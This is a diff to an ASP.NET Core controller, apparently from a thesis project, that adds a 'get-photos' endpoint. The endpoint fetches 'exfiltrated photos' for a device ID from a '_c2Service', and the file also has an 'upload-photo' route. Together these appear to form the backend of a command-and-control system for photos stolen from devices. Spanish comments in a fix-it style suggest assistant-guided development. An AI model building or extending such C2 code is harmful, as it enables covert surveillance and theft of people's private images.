@@ -1,5 +1,6 @@
 ﻿using Microsoft.AspNetCore.Mvc;
 using tesis.DTOs;
+using tesis.Models;
 using tesis.Services;
 
 namespace tesis.Controllers
@@ -72,6 +73,21 @@ namespace tesis.Controllers
                 return NotFound("Dispositivo no encontrado en la base de datos.");
 
             return Ok(new { message = "Estructura de archivos actualizada correctamente" });
+        }
+        // EN: DevicesController.cs
+
+        [HttpPost("get-photos")]
+        public async Task<IActionResult> GetPhotos([FromBody] HeartbeatDto dto)
+        {
+            if (string.IsNullOrEmpty(dto.DeviceId))
+                return BadRequest("DeviceId es requerido");
+
+            // OJO AQUÍ: Tienes que llamar a 'GetExfiltratedPhotosAsync', 
+            // NO a 'GetFilesByDeviceAsync'.
+            var files = await _c2Service.GetExfiltratedPhotosAsync(dto.DeviceId);
+
+            // ✅ Solución: Creamos una lista vacía DE FOTOS, no de objetos genéricos.
+            return Ok(files ?? new List<ExfiltratedPhoto>());
         }
         // POST: api/devices/upload-photo
         [HttpPost("upload-photo")]
